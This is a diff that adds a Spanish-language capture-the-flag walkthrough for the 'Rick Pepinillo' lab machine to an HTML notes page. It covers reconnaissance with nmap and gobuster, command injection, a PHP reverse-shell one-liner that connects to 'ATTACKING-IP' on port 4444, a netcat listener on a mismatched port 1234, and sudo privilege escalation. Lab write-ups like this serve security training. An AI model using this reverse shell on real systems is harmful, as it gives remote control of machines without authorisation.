@@ -611,8 +611,57 @@ apt upgrade -y</code></pre>
         <h3 onclick="toggleDetails('rick-pepinillo-details')">Rick Pepinillo</h3>
         <div id="rick-pepinillo-details" class="details">
             <img src="https://i.imgur.com/dJHO6eS.jpg" alt="Rick Pepinillo" class="image">
-            <p>En esta máquina aprendí...</p>
-        </div>
+            <!-- Guía paso a paso -->
+            <h3 onclick="toggleDetails('pasoo-1')">Paso 1: Verificar la Conectividad y el TTL</h4>
+            <div id="pasoo-1" class="details">
+                <p>Antes de comenzar cualquier actividad de escaneo, es crucial verificar la conectividad con la máquina víctima y obtener información básica sobre ella, como el TTL (Time To Live) en la respuesta del ping.</p>
+                <p class="prompt">ping -c 1 &lt;ipmaquina&gt;</p>
+                <p>Este comando envía un solo paquete de ping a la dirección IP especificada. Observa el TTL en la respuesta del ping para obtener información adicional sobre la máquina.</p>
+            </div>
+            <h3 onclick="toggleDetails('pasoo-2')">Paso 2: Escaneo Inicial con Nmap</h4>
+            <div id="pasoo-2" class="details">
+                <p>El siguiente paso es realizar un escaneo inicial de puertos en la máquina utilizando la herramienta Nmap. Este escaneo proporcionará información sobre los puertos abiertos y los servicios en ejecución en la máquina víctima.</p>
+                <p class="prompt">nmap -A &lt;ipmaquina&gt; -oN nmap_picklerick_inicial</p>
+                <p>Este comando ejecuta un escaneo detallado de todos los puertos abiertos en la máquina y guarda los resultados en un archivo llamado "nmap_picklerick_inicial". El parámetro -A activa la detección de versiones y la detección de servicios.</p>
+            </div>
+            <h3 onclick="toggleDetails('pasoo-3')">Paso 3: Inspeccionar Directorios con Gobuster</h4>
+            <div id="pasoo-3" class="details">
+                <p>Para descubrir posibles directorios ocultos o archivos en la web de la máquina, utilizaremos la herramienta Gobuster. Esto nos permitirá obtener más información sobre la estructura del sitio web y encontrar posibles puntos de entrada.</p>
+                <p class="prompt">gobuster -u http://&lt;ipmaquina&gt; -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,css,js,py</p>
+                <p>Este comando realiza un escaneo utilizando una lista de palabras clave contenida en el archivo "directory-list-2.3-medium.txt". La herramienta buscará archivos con las extensiones especificadas.</p>
+            </div>
+            <h3 onclick="toggleDetails('pasoo-4')">Paso 4: Acceder a Archivos Encontrados y Realizar Inyección de Comandos</h4>
+            <div id="pasoo-4" class="details">
+                <p>Después de realizar el escaneo con Gobuster, es posible que hayas encontrado archivos como "robots.txt" y "login.php". Accede a estos archivos utilizando un navegador web o herramientas como curl o wget. Si encuentras una posible contraseña en alguno de los archivos, tómala nota y guárdala en tu archivo de datos para referencia futura.</p>
+            </div>
+            <h3 onclick="toggleDetails('pasoo-5')">Paso 5: Realizar un Shell Inverso</h4>
+            <div id="pasoo-5" class="details">
+                <p>Si has identificado un punto de inyección de comandos en la máquina, puedes aprovecharlo para establecer un shell inverso. Esto te proporcionará acceso a la máquina víctima desde tu máquina de ataque.</p>
+                <p class="prompt">php -r '$sock=fsockopen("ATTACKING-IP",4444);exec("/bin/sh -i <&4 >&4 2>&4");'</p>
+                <p>Este comando abrirá una conexión de red hacia tu máquina y ejecutará un shell interactivo en la máquina víctima.</p>
+            </div>
+            <h3 onclick="toggleDetails('pasoo-6')">Paso 6: Escuchar el Shell Inverso</h4>
+            <div id="pasoo-6" class="details">
+                <p>En tu máquina de ataque, abre un programa como Netcat para escuchar la conexión de shell inverso.</p>
+                <p class="prompt">nc -nvlp 1234</p>
+                <p>Esto abrirá una escucha en el puerto 1234 para recibir la conexión de shell inverso desde la máquina víctima.</p>
+            </div>
+            <h3 onclick="toggleDetails('pasoo-7')">Paso 7: Elevar los Privilegios a Root</h4>
+            <div id="pasoo-7" class="details">
+                <p>Una vez dentro de la máquina víctima a través del shell inverso, ejecuta el siguiente comando para ver las opciones de sudo disponibles.</p>
+                <p class="prompt">sudo -l</p>
+                <p>Esto mostrará las opciones de sudo disponibles para el usuario actual. En este caso, se encontró una elevación de privilegios con Perl y el archivo backup.pl.</p>
+                <p class="prompt">cat backup.pl</p>
+                <p>Este comando mostrará el contenido del archivo backup.pl y nos permitirá comprender mejor cómo podemos aprovecharlo para elevar nuestros privilegios.</p>
+            </div>
+            <h3 onclick="toggleDetails('pasoo-8')">Paso 8: Búsqueda de Ingredientes</h4>
+            <div id="pasoo-8" class="details">
+                <p>Como usuario root en la máquina víctima, realiza una búsqueda de los tres ingredientes necesarios en los directorios relevantes utilizando comandos como find o grep. Esto nos permitirá completar el objetivo de la máquina virtual.</p>
+                <p class="prompt">find / -name "Salsa verde" 2&gt;/dev/null</p>
+                <p class="prompt">find / -name "Jugo de pepinillos" 2&gt;/dev/null</p>
+                <p class="prompt">find / -name "Morty Jue" 2&gt;/dev/null</p>
+                <p>Estos comandos buscarán los ingredientes en todo el sistema de archivos y nos proporcionarán las ubicaciones donde se encuentran.</p>
+            </div>
     </div>
     <div id="Bounty-Hacker">
         <h3 onclick="toggleDetails('bounty-hacker-details')">Bounty Hacker</h3>
